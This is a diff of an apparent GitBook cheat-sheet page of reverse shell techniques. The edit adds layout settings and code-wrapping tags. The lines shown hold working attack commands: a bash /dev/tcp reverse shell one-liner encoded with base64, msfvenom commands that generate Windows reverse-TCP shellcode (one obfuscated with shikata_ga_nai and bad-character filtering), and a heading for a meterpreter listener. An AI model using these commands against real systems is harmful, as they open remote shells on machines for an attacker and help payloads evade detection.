@@ -1,8 +1,19 @@
 ---
 description: Various reverse shell techniques in fast go cheat-sheet format
+layout:
+  title:
+    visible: true
+  description:
+    visible: true
+  tableOfContents:
+    visible: true
+  outline:
+    visible: true
+  pagination:
+    visible: true
 ---
 
-# 🐚 Reverse Shells
+# Reverse Shells
 
 ### PowerShell Base64
 
@@ -95,15 +106,19 @@ echo 'bash -i>& /dev/tcp/<ip>/4444 0>&1' | base64
 
 Generating shell code
 
+{% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f powershell -v sc
 ```
+{% endcode %}
 
 Generating obfuscated shell code with bad words:
 
+{% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
 ```
+{% endcode %}
 
 Start meterpreter listener one-liner
 
